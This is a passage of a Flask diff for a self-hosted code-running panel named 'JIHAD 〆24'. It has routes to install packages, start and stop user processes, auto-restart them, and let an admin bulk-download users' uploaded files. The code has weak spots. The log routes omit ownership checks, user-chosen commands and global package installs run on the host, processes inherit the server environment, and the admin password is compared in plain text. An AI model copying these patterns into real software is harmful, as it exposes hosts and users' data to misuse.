+            result = subprocess.run(["npm", "install", "-g", pkg], capture_output=True, text=True, timeout=60)
+            if result.returncode == 0:
+                results["static"].append(pkg)
+            else:
+                results["failed"].append(f"static:{pkg}")
+        except Exception:
+            results["failed"].append(f"static:{pkg}")
+    return jsonify({
+        "success": True,
+        "installed": results["python"] + results["node"] + results["static"],
+        "python_count": len(results["python"]),
+        "node_count": len(results["node"]),
+        "static_count": len(results["static"]),
+        "failed": results["failed"]
+    })
+
+@app.route("/server/<name>/packages/remove", methods=["POST"])
+@login_required
+def remove_package(name):
+    data = load_data()
+    cfg = data["servers"].get(name)
+    if not cfg:
+        return jsonify({"success": False}), 404
+    if cfg.get("owner") != session["username"] and not session.get("admin"):
+        return jsonify({"success": False}), 403
+    payload = request.get_json()
+    pkg_name = payload.get("name", "")
+    cfg["packages"] = [p for p in cfg.get("packages", []) if p["name"] != pkg_name]
+    data["servers"][name] = cfg
+    save_data(data)
+    return jsonify({"success": True})
+
+@app.route("/server/<name>/settings", methods=["POST"])
+@login_required
+def save_settings(name):
+    data = load_data()
+    cfg = data["servers"].get(name)
+    if not cfg:
+        return jsonify({"success": False, "error": "Server not found"}), 404
+    if cfg.get("owner") != session["username"] and not session.get("admin"):
+        return jsonify({"success": False, "error": "Access denied"}), 403
+    payload = request.get_json()
+    cfg["main_file"] = payload.get("main_file", cfg.get("main_file", ""))
+    cfg["main_command"] = payload.get("main_command", cfg.get("main_command", ""))
+    cfg["port"] = payload.get("port", cfg.get("port", 8080))
+    data["servers"][name] = cfg
+    save_data(data)
+    return jsonify({"success": True})
+
+@app.route("/server/<name>/auto-reset/settings", methods=["POST"])
+@login_required
+def save_auto_reset_settings(name):
+    data = load_data()
+    cfg = data["servers"].get(name)
+    if not cfg:
+        return jsonify({"success": False, "error": "Server not found"}), 404
+    if cfg.get("owner") != session["username"] and not session.get("admin"):
+        return jsonify({"success": False, "error": "Access denied"}), 403
+    payload = request.get_json()
+    enabled = bool(payload.get("enabled", False))
+    years = int(payload.get("years", 0) or 0)
+    days = int(payload.get("days", 0) or 0)
+    hours = int(payload.get("hours", 0) or 0)
+    minutes = int(payload.get("minutes", 0) or 0)
+    seconds = int(payload.get("seconds", 0) or 0)
+    cfg["auto_reset"] = {"enabled": enabled, "years": years, "days": days,
+                         "hours": hours, "minutes": minutes, "seconds": seconds}
+    data["servers"][name] = cfg
+    save_data(data)
+    if name in RESET_TIMERS:
+        try:
+            RESET_TIMERS[name]["timer"].cancel()
+        except Exception:
+            pass
+        del RESET_TIMERS[name]
+    if enabled:
+        total = _auto_reset_seconds(cfg)
+        if total > 0:
+            _schedule_reset(name, total)
+    return jsonify({"success": True})
+
+@app.route("/server/<name>/auto-reset", methods=["POST"])
+@login_required
+def trigger_auto_reset(name):
+    data = load_data()
+    cfg = data["servers"].get(name)
+    if not cfg:
+        return jsonify({"success": False, "error": "Server not found"}), 404
+    if cfg.get("owner") != session["username"] and not session.get("admin"):
+        return jsonify({"success": False, "error": "Access denied"}), 403
+    threading.Thread(target=_do_auto_reset, args=[name], daemon=True).start()
+    return jsonify({"success": True})
+
+@app.route("/server/<name>/auto-reset/status")
+@login_required
+def auto_reset_status(name):
+    data = load_data()
+    cfg = data["servers"].get(name)
+    if not cfg:
+        return jsonify({"remaining": 0, "total": 0})
+    if name in RESET_TIMERS:
+        entry = RESET_TIMERS[name]
+        started = datetime.fromisoformat(entry["started_at"])
+        elapsed = (datetime.now() - started).total_seconds()
+        remaining = max(0, entry["total_seconds"] - int(elapsed))
+        return jsonify({"remaining": remaining, "total": entry["total_seconds"]})
+    total = _auto_reset_seconds(cfg)
+    return jsonify({"remaining": total, "total": total})
+
+@app.route("/server/<name>/start", methods=["POST"])
+@login_required
+def start_server(name):
+    data = load_data()
+    cfg = data["servers"].get(name)
+    if not cfg:
+        return jsonify({"success": False, "error": "Server not found"}), 404
+    if cfg.get("owner") != session["username"] and not session.get("admin"):
+        return jsonify({"success": False, "error": "Access denied"}), 403
+    pid = cfg.get("pid")
+    if pid and is_process_alive(pid):
+        return jsonify({"success": False, "error": "Already running"})
+    main_file = cfg.get("main_file") or "main.py"
+    main_cmd = cfg.get("main_command") or ""
+    extract_dir = SERVERS_DIR / name / "extracted"
+    main_path = extract_dir / main_file
+    if not main_path.exists():
+        return jsonify({"success": False, "error": f"{main_file} not found. Upload your files first."})
+    log_path = SERVERS_DIR / name / "logs.txt"
+    log_path.parent.mkdir(parents=True, exist_ok=True)
+    if main_cmd:
+        cmd = main_cmd.split()
+    else:
+        cmd = get_run_command(cfg.get("runtime", "python"), main_file)
+    env = os.environ.copy()
+    env["PORT"] = str(cfg.get("port", 8080))
+    try:
+        with open(log_path, "a") as lf:
+            lf.write(f"\n{'='*50}\n[{datetime.now().isoformat()}] Starting: {' '.join(cmd)}\n{'='*50}\n")
+        log_file = open(log_path, "a")
+        proc = subprocess.Popen(cmd, cwd=str(extract_dir), stdout=log_file,
+                                stderr=log_file, env=env, preexec_fn=os.setsid)
+        RUNNING_PROCESSES[name] = {"proc": proc, "log_file": log_file}
+        cfg["status"] = "running"
+        cfg["pid"] = proc.pid
+        data["servers"][name] = cfg
+        save_data(data)
+        notify_server_start(session.get("username", "?"), name, main_file)
+        return jsonify({"success": True, "pid": proc.pid})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)})
+
+@app.route("/server/<name>/stop", methods=["POST"])
+@login_required
+def stop_server(name):
+    data = load_data()
+    cfg = data["servers"].get(name)
+    if not cfg:
+        return jsonify({"success": False}), 404
+    if cfg.get("owner") != session["username"] and not session.get("admin"):
+        return jsonify({"success": False}), 403
+    pid = cfg.get("pid")
+    stopped = False
+    if name in RUNNING_PROCESSES:
+        entry = RUNNING_PROCESSES[name]
+        proc = entry["proc"]
+        try:
+            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+        except Exception:
+            try:
+                proc.terminate()
+            except Exception:
+                pass
+        try:
+            proc.wait(timeout=5)
+        except Exception:
+            try:
+                proc.kill()
+            except Exception:
+                pass
+        try:
+            entry["log_file"].close()
+        except Exception:
+            pass
+        del RUNNING_PROCESSES[name]
+        stopped = True
+    if pid and not stopped:
+        kill_process(pid)
+    log_path = SERVERS_DIR / name / "logs.txt"
+    try:
+        with open(log_path, "a") as lf:
+            lf.write(f"[{datetime.now().isoformat()}] Server stopped\n")
+    except Exception:
+        pass
+    cfg["status"] = "stopped"
+    cfg["pid"] = None
+    data["servers"][name] = cfg
+    save_data(data)
+    notify_server_stop(session.get("username", "?"), name)
+    return jsonify({"success": True})
+
+def auto_restart_stopped_servers():
+    last_attempt = {}
+    while True:
+        time.sleep(15)
+        data = load_data()
+        if not data.get("settings", {}).get("global_auto_reset", True):
+            continue
+        for name, cfg in data["servers"].items():
+            now = time.time()
+            if name in last_attempt and now - last_attempt[name] < 60:
+                continue
+            pid = cfg.get("pid")
+            if pid and not is_process_alive(pid):
+                cfg["status"] = "stopped"
+                cfg["pid"] = None
+                save_data(data)
+            if cfg.get("status") == "stopped":
+                main_file = cfg.get("main_file") or "main.py"
+                extract_dir = SERVERS_DIR / name / "extracted"
+                if (extract_dir / main_file).exists():
+                    last_attempt[name] = now
+                    threading.Thread(target=_do_auto_reset, args=[name], daemon=True).start()
+
+threading.Thread(target=auto_restart_stopped_servers, daemon=True).start()
+
+@app.route("/server/<name>/logs")
+@login_required
+def get_logs(name):
+    data = load_data()
+    cfg = data["servers"].get(name)
+    if not cfg:
+        return jsonify({"logs": "Server not found"})
+    log_path = SERVERS_DIR / name / "logs.txt"
+    if not log_path.exists():
+        return jsonify({"logs": "No logs yet. Start the server to see output."})
+    try:
+        if log_path.stat().st_size > 1024 * 1024:
+            with open(log_path, 'r', errors='replace') as f:
+                f.seek(-50000, 2)
+                content = f.read()
+            content = "... (showing last 50KB) ...\n" + content
+        else:
+            content = log_path.read_text(errors="replace")
+        lines = content.splitlines()
+        if len(lines) > 200:
+            lines = lines[-200:]
+            content = "... (showing last 200 lines) ...\n" + "\n".join(lines)
+        return jsonify({"logs": content or "No output yet."})
+    except Exception as e:
+        return jsonify({"logs": f"Error reading logs: {e}"})
+
+@app.route("/server/<name>/logs/clear", methods=["POST"])
+@login_required
+def clear_logs(name):
+    data = load_data()
+    cfg = data["servers"].get(name)
+    if not cfg:
+        return jsonify({"success": False})
+    log_path = SERVERS_DIR / name / "logs.txt"
+    try:
+        log_path.write_text("")
+    except Exception:
+        pass
+    return jsonify({"success": True})
+
+# ─── Admin Routes ────────────────────────────────────────────────────
+@app.route("/admin/login", methods=["GET", "POST"])
+def admin_login():
+    data = load_data()
+    settings = data.get("settings", {})
+    site_name = settings.get("site_name", "JIHAD 〆24")
+    if request.method == "POST":
+        pw = request.form.get("password", "")
+        admin_pass = settings.get("admin_password", ADMIN_PASSWORD)
+        if pw == admin_pass:
+            session["admin"] = True
+            return redirect(url_for("admin_dashboard"))
+        return render_template("admin_login.html", error="Wrong admin password", site_name=site_name)
+    return render_template("admin_login.html", error=None, site_name=site_name)
+
+@app.route("/admin/logout")
+def admin_logout():
+    session.pop("admin", None)
+    return redirect(url_for("login"))
+
+@app.route("/admin")
+@admin_required
+def admin_dashboard():
+    data = load_data()
+    servers = data["servers"]
+    users_raw = data["users"]
+    settings = data.get("settings", {})
+    site_name = settings.get("site_name", "JIHAD 〆24")
+
+    for name, cfg in servers.items():
+        pid = cfg.get("pid")
+        if pid and not is_process_alive(pid):
+            cfg["status"] = "stopped"
+            cfg["pid"] = None
+
+    running = sum(1 for v in servers.values() if v.get("status") == "running")
+    total_files = 0
+    for sname in servers:
+        ed = SERVERS_DIR / sname / "extracted"
+        if ed.exists():
+            total_files += sum(1 for f in ed.rglob("*") if f.is_file())
+
+    user_stats = []
+    for u, u_data in users_raw.items():
+        u_servers = [v for v in servers.values() if v.get("owner") == u]
+        u_files = 0
+        for sv in u_servers:
+            ed = SERVERS_DIR / sv["name"] / "extracted"
+            if ed.exists():
+                u_files += sum(1 for f in ed.rglob("*") if f.is_file())
+        user_stats.append({
+            "username": u,
+            "projects": len(u_servers),
+            "running": sum(1 for sv in u_servers if sv.get("status") == "running"),
+            "files": u_files,
+            "joined": u_data.get("joined", "")
+        })
+
+    return render_template("admin.html", users=user_stats, servers=servers, settings=settings,
+                           total_users=len(users_raw), total_projects=len(servers),
+                           running=running, total_files=total_files,
+                           theme_presets=THEME_PRESETS, site_name=site_name)
+
+@app.route("/admin/user/<username>/files")
+@admin_required
+def admin_user_files(username):
+    data = load_data()
+    user_servers = {k: v for k, v in data["servers"].items() if v.get("owner") == username}
+    file_data = {}
+    for name, cfg in user_servers.items():
+        ed = SERVERS_DIR / name / "extracted"
+        file_data[name] = {"config": cfg, "files": list_files(ed)}
+    return render_template("admin_files.html", username=username, file_data=file_data)
+
+@app.route("/admin/user/<username>/delete", methods=["POST"])
+@admin_required
+def admin_delete_user(username):
+    data = load_data()
+    to_delete = [k for k, v in data["servers"].items() if v.get("owner") == username]
+    for name in to_delete:
+        pid = data["servers"][name].get("pid")
+        if pid:
+            kill_process(pid)
+        if name in RUNNING_PROCESSES:
+            try:
+                RUNNING_PROCESSES[name]["proc"].terminate()
+            except Exception:
+                pass
+            del RUNNING_PROCESSES[name]
+        if name in RESET_TIMERS:
+            try:
+                RESET_TIMERS[name]["timer"].cancel()
+            except Exception:
+                pass
+            del RESET_TIMERS[name]
+        shutil.rmtree(SERVERS_DIR / name, ignore_errors=True)
+        del data["servers"][name]
+    data["users"].pop(username, None)
+    save_data(data)
+    return redirect(url_for("admin_dashboard"))
+
+@app.route("/admin/maintenance", methods=["POST"])
+@admin_required
+def toggle_maintenance():
+    data = load_data()
+    payload = request.get_json()
+    data["settings"]["maintenance"] = bool(payload.get("enabled", False))
+    msg = payload.get("message", "").strip()
+    if msg:
+        data["settings"]["maintenance_msg"] = msg
+    save_data(data)
+    return jsonify({"success": True})
+
+@app.route("/admin/theme", methods=["POST"])
+@admin_required
+def set_theme():
+    data = load_data()
+    payload = request.get_json()
+    color = payload.get("color", "#a855f7").strip()
+    if not color.startswith("#") or len(color) not in (4, 7):
+        return jsonify({"success": False, "error": "Invalid color"})
+    data["settings"]["theme_color"] = color
+    save_data(data)
+    return jsonify({"success": True})
+
+@app.route("/admin/global-auto-reset", methods=["POST"])
+@admin_required
+def admin_global_auto_reset():
+    data = load_data()
+    payload = request.get_json()
+    data["settings"]["global_auto_reset"] = bool(payload.get("enabled", True))
+    save_data(data)
+    return jsonify({"success": True})
+
+@app.route("/admin/site-settings", methods=["POST"])
+@admin_required
+def admin_site_settings():
+    data = load_data()
+    payload = request.get_json()
+    if "site_name" in payload:
+        data["settings"]["site_name"] = payload["site_name"].strip() or "JIHAD 〆24"
+    if "admin_password" in payload and payload["admin_password"].strip():
+        data["settings"]["admin_password"] = payload["admin_password"].strip()
+    if "normal_password" in payload and payload["normal_password"].strip():
+        data["settings"]["normal_password"] = payload["normal_password"].strip()
+    save_data(data)
+    return jsonify({"success": True})
+
+@app.route("/admin/server/<name>/delete", methods=["POST"])
+@admin_required
+def admin_delete_server(name):
+    data = load_data()
+    cfg = data["servers"].get(name)
+    if not cfg:
+        return redirect(url_for("admin_dashboard"))
+    pid = cfg.get("pid")
+    if pid:
+        kill_process(pid)
+    if name in RUNNING_PROCESSES:
+        try:
+            RUNNING_PROCESSES[name]["proc"].terminate()
+        except Exception:
+            pass
+        del RUNNING_PROCESSES[name]
+    if name in RESET_TIMERS:
+        try:
+            RESET_TIMERS[name]["timer"].cancel()
+        except Exception:
+            pass
+        del RESET_TIMERS[name]
+    shutil.rmtree(SERVERS_DIR / name, ignore_errors=True)
+    del data["servers"][name]
+    save_data(data)
+    return redirect(url_for("admin_dashboard"))
+
+@app.route("/admin/file/<name>/download")
+@admin_required
+def admin_download_file(name):
+    path_arg = request.args.get("path", "")
+    base = SERVERS_DIR / name / "extracted"
+    safe_path = (base / path_arg).resolve()
+    if not str(safe_path).startswith(str(base)) or not safe_path.exists() or safe_path.is_dir():
+        abort(404)
+    return send_file(safe_path, as_attachment=True, download_name=safe_path.name)
+
+@app.route("/admin/project/<project_name>/download")
+@admin_required
+def admin_download_project(project_name):
+    type_filter = request.args.get("type", "all")
+    extract_dir = SERVERS_DIR / project_name / "extracted"
+    if not extract_dir.exists():
+        abort(404)
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+        for f in extract_dir.rglob("*"):
+            if not f.is_file():
+                continue
+            if type_filter != "all" and not f.name.endswith(type_filter):
+                continue
+            zf.write(f, f.relative_to(extract_dir))
+    buf.seek(0)
+    ext_part = type_filter.replace(".", "") if type_filter != "all" else ""
+    fname = f"{project_name}{'-' + ext_part if ext_part else ''}.zip"
+    return send_file(buf, as_attachment=True, download_name=fname, mimetype="application/zip")
+
+@app.route("/admin/user/<username>/download")
+@admin_required
+def admin_download_user(username):
+    type_filter = request.args.get("type", "all")
+    data = load_data()
+    user_servers = {k: v for k, v in data["servers"].items() if v.get("owner") == username}
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+        for name in user_servers:
+            extract_dir = SERVERS_DIR / name / "extracted"
+            if not extract_dir.exists():
+                continue
+            for f in extract_dir.rglob("*"):
+                if not f.is_file():
+                    continue
+                if type_filter != "all" and not f.name.endswith(type_filter):
+                    continue
+                arcname = Path(name) / f.relative_to(extract_dir)
+                zf.write(f, arcname)
+    buf.seek(0)
+    ext_part = type_filter.replace(".", "") if type_filter != "all" else ""
+    fname = f"{username}-files{'-' + ext_part if ext_part else ''}.zip"
+    return send_file(buf, as_attachment=True, download_name=fname, mimetype="application/zip")
+
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port, debug=False)
